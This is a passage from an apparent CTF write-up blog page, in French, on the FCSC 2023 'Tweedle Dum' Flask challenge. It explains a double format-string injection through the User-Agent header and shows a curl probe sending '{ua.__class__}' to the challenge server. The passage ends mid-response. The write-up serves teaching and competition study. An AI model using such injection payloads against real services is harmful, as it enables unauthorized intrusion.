@@ -1,0 +1,1798 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Tweedle Dum &amp; Dee | FCSC 2023</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Tweedle&#32;Dum&#32;&amp;&#32;Dee&#32;|&#32;FCSC&#32;2023 />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Tweedle&#32;Dum&#32;&amp;&#32;Dee&#32;|&#32;FCSC&#32;2023 />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Tweedle&#32;Dum&#32;&amp;&#32;Dee&#32;|&#32;FCSC&#32;2023 />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Tweedle&#32;Dum&#32;&amp;&#32;Dee&#32;|&#32;FCSC&#32;2023 />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Voici un writeup complet des 2 challenges Web &#39;Tweedle Dum&#39; et &#39;Tweedle Dee&#39; crées par Bitk lors du FCSC 2023" />
+<meta itemprop="description" content="Voici un writeup complet des 2 challenges Web &#39;Tweedle Dum&#39; et &#39;Tweedle Dee&#39; crées par Bitk lors du FCSC 2023" />
+<meta property="og:description" content="Voici un writeup complet des 2 challenges Web &#39;Tweedle Dum&#39; et &#39;Tweedle Dee&#39; crées par Bitk lors du FCSC 2023" />
+<meta name="twitter:description" content="Voici un writeup complet des 2 challenges Web &#39;Tweedle Dum&#39; et &#39;Tweedle Dee&#39; crées par Bitk lors du FCSC 2023" />
+
+
+<base href="//localhost:1313/writeups/tweedle-dum-dee/" />
+<link rel="canonical" href="//localhost:1313/writeups/tweedle-dum-dee/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/tweedle-dum-dee/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/tweedle-dum-dee/" />
+<meta property="og:url" content="//localhost:1313/writeups/tweedle-dum-dee/" />
+
+
+<meta property="og:updated_time" content="2023-04-27T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/tweedle-dum-dee/">Tweedle Dum &amp; Dee | FCSC 2023</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2023-04-27T12:00:00Z" class="post-date">
+        April 27, 2023
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>14 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-python">
+        <a href="//localhost:1313/tags/python">python</a>
+      </li>
+      
+      <li class="tag-flask">
+        <a href="//localhost:1313/tags/flask">flask</a>
+      </li>
+      
+      <li class="tag-format-string">
+        <a href="//localhost:1313/tags/format-string">format-string</a>
+      </li>
+      
+      <li class="tag-injection">
+        <a href="//localhost:1313/tags/injection">injection</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<h1 id="introduction-des-deux-challenges">Introduction des deux challenges:</h1>
+<pre tabindex="0"><code>Au cours de ses aventures au Pays des merveilles, Alice a rencontré une curieuse paire de jumeaux : Tweedledee et Tweedledum. Les deux avaient créé un site web simpliste en utilisant Flask, une réalisation qui a suscité l&#39;intérêt d&#39;Alice. Avec son esprit curieux et son penchant pour la technologie, Alice ne pouvait s&#39;empêcher de se demander si elle pouvait pirater leur création et en découvrir les secrets.
+</code></pre><p>Tweedle Dee est dans la continuité de Tweedle Dum et c&rsquo;est pour cela que je détaillerai ce dernier en première partie.</p>
+<h1 id="tweedle-dum">Tweedle Dum</h1>
+<p>Les sources de ce challenges sont fournies :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── docker-compose.yml
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>└── src
+</span></span><span style="display:flex;"><span>    ├── app.py
+</span></span><span style="display:flex;"><span>    ├── static
+</span></span><span style="display:flex;"><span>    │   ├── style.css
+</span></span><span style="display:flex;"><span>    │   └── tweedle.png
+</span></span><span style="display:flex;"><span>    └── templates
+</span></span><span style="display:flex;"><span>        └── index.html
+</span></span></code></pre></div><p>La partie qui nous intéresse est le fichier <code>app.py</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.middleware.proxy_fix <span style="color:#f92672">import</span> ProxyFix
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.debug <span style="color:#f92672">import</span> DebuggedApplication
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># No bruteforce needed, this is just here so you don&#39;t lock yourself or others out by accident</span>
+</span></span><span style="display:flex;"><span>DebuggedApplication<span style="color:#f92672">.</span>_fail_pin_auth <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> self: <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>wsgi_app <span style="color:#f92672">=</span> ProxyFix(app<span style="color:#f92672">.</span>wsgi_app, x_for<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello_agent</span>():
+</span></span><span style="display:flex;"><span>    ua <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>user_agent
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Hello </span><span style="color:#e6db74">{</span>ua<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ua<span style="color:#f92672">=</span>ua))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># TODO: add the vulnerable code here</span>
+</span></span></code></pre></div><p>La challenge ce présente donc sous la forme d&rsquo;une application web qui tourne sur le serveur flask.
+Le seul endpoint qui semble atteignable est à la racine : <code>https://tweedle-dum.france-cybersecurity-challenge.fr/</code></p>
+<p><img src="./img/1.png" alt="Alt text"></p>
+<p>Si on se concentre sur le code, on comprend que notre <strong>User-Agent</strong> est render dans la template html:</p>
+<ul>
+<li><code>render_template(&quot;index.html&quot;, msg=f&quot;Hello {ua}&quot;.format(ua=ua))</code></li>
+<li><code>&lt;div id=&quot;bubble&quot;&gt;{{msg}}&lt;/div&gt;</code> <em>(index.html)</em></li>
+</ul>
+<p>Ce genre de code n&rsquo;est pas vulnérable à une <code>SSTI</code> <em>Server-Side-Template-Injection</em> puisque la variable <code>ua</code> est correctement render.</p>
+<p>En revanche une subtilité rend ce code vulnérable à une attaque par <code>Format-String</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Hello </span><span style="color:#e6db74">{</span>ua<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ua<span style="color:#f92672">=</span>ua)
+</span></span></code></pre></div><p>La présence d&rsquo;une <em>double</em> format string permet d&rsquo;injecter un payload dans la variable <code>ua</code></p>
+<h4 id="explications-">Explications :</h4>
+<ul>
+<li>
+<p>La première format string agit de la sorte:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> ua <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;vozec&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Hello </span><span style="color:#e6db74">{</span>ua<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;Hello vozec&#39;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>La seconde :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> ua <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;vozec&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;Hello </span><span style="color:#e6db74">{ua}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ua<span style="color:#f92672">=</span>ua)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;Hello vozec&#39;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h5 id="vulnérabilité-">Vulnérabilité :</h5>
+<p>Si on injecte ce type d’entrée : <code>{ua.__class__}</code>, la première format-string va créer cette string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;Hello {{ua.__class__}}&#34;</span>
+</span></span></code></pre></div><p>et la seconde va render et remplacer <code>ua.__class__</code> par l&rsquo;objet python correspondant.</p>
+<p>On peut vérifier de cette manière :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl https://tweedle-dum.france-cybersecurity-challenge.fr -H <span style="color:#e6db74">&#39;User-Agent:{ua.__class__}&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Résultat:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span> /&gt;
